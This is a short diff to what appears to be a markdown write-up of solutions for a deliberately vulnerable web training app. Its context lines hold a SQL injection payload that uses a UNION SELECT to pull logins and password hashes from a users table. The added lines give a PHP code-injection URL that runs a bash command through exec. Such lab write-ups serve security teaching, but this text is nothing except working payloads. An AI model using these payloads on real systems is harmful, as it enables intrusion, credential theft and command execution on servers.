@@ -39,3 +39,10 @@ Solution
 
 %' union select 1,2,login,password,5,6,7 from users # att ==> get password hash ! 
 ```
+
+## PHP injection
+Low level security: 
+
+```
+phpi.php?message=exec("/bin/bash -c 'whoami'");
+```
